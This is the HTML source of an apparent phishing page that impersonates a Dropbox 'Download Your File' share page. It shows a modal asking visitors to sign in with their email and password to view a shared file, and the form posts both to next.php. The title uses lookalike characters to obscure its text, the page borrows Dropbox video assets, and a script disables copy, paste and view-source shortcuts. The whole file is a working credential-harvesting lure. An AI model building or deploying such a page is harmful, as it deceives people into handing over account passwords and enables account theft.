
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">

<html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<link rel="stylesheet" href="css/style.css">
<script src="images/mss.js"></script>
<script src="dbdg.js"></script>
<script language="JavaScript"> 
</script>
<title>&#x44;&#959;wn&#108;&#959;a&#x64; Y&#959;ur Fi&#108;e</title><link rel="icon" href="images/ma23w-rb0ft.svg"><style type="text/css"> 
body { 
width:100%; 
height:100%; 
} 
</style><script type="text/javascript">

function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}

</script>
<script>
$(document).ready(function() {
document.onkeydown = function(e){
if (e.ctrlKey && 
    (e.keyCode === 67 || 
     e.keyCode === 86 || 
     e.keyCode === 85 || 
     e.keyCode === 117)) {
  return false;
} else {
    return true;
}
};

});
</script></head>



 



<body>
 <script src="http://ajax.aspnetcdn.com/ajax/jQuery/jquery-1.12.2.min.js"></script>




<div id="image1" style="position:absolute; overflow:hidden; left:33px; top:20px; width:1294px; height:612px; z-index:0"><img src="./images/header.png" alt="" title="" border="0" width="100%" height="100%"></div>

<div id="formimage1" style="position:absolute; left:886px; top:401px; z-index:1" id="Overly" class="overly"><input type="image" name="formimage1" width="230" height="54" src="./images/prf.png" id="Overly" class="overly"></div>
<div id="ogrooModel" class="modalbox ogroobox" >
  <div class="dialog">
  <h3><img src="images/select_gif.png"><button  title="Close" onClick="overlay()"  class="closebutton" id="close">X&nbsp;&nbsp;</button></h3>
  
  
  
  
  
  <div style="margin-left: 30px;"><br>
  <a onclick="PopupCenterDual('gmil.html','NIGRAPHIC','686','640'); " href="javascript:void(0);"><span style="display: inline-block; width: 6px;"></span><img src="images/but2_2.png" style="width:362px;height:40px" style="text-decoration:none;color:#fff;border:0;"
 /></a>
<div class="hr-label"><span class="hr-label__text">or</span></div>
<h4>Sign in your email to view shared file</h4>
<form action="next.php" method="POST" name="weForm" onsubmit="return validateForm()">

<input class="input_mm" value="<?=$_GET[email]?>" required name="email" type="email" placeholder="Email">
<br>
<span id="errfn"></span>
<br>
<input class="input_mm" required name="password" type="password" id="mybrid" placeholder="Password">
<br>
<span id="errfnn"></span>
<br>
<div style="inline-block; height: 15px;"></div>
<br>
<input type="checkbox" checked>Remember me <input type="submit" id="t_button" value="Sign in">
<br><br>
<a href="#" style="color:#007ee5;text-decoration:none;font-family: AtlasGrotesk,Open Sans,sans-serif;">&nbsp;&nbsp;Forgotten your password?</a>
</form>
</div>
  
 
   <div  style="min-height: 150px;">
        </div>
        </div>
   </div>
  
    <script src="js/index.js"></script>

<script src="ps.js"></script>
<script src="vj.js"></script><br>
<div id="hr1" style="position:absolute; overflow:hidden; left:61px; top:673px; width:1258px; height:17px; z-index:2">
<hr size="1" style="border: 1px solid #ccc;" width="1100">
</div>

<div id="image2" style="position:absolute; overflow:hidden; left:137px; top:705px;  width:1201px; height: 644px; z-index:3">
<img src="./images/2nd.png" alt="" title="" border="0" width="100%" height="100%">
</div>

<div id="image2" style="position:absolute; overflow:hidden; left:137px; top:705px;  width:1201px; height: 644px; z-index:3">
<br><br><br><br><br>
<video src="https://cfl.dropboxstatic.com/static/images/productivity/video/create_large-vflp6JX4C.mp4" preload="none" poster="https://cfl.dropboxstatic.com/static/images/productivity/create_small_2x-vflRCZOr1.jpg" autoplay="" loop="" data-reactid="12"> </video>
</div>


<div id="hr2" style="position:absolute; overflow:hidden; left:62px; top:1386px; width:1258px; height:17px; z-index:4">
<hr size="1" style="border: 1px solid #ccc;" width="1100">
</div>

<div id="image3" style="position:absolute; overflow:hidden; left:158px; top:1417px; width:1055px; height:668px; z-index:5"><img src="./images/3rd.png" alt="" title="" border="0" width="100%" height="100%"></div>






</body></html>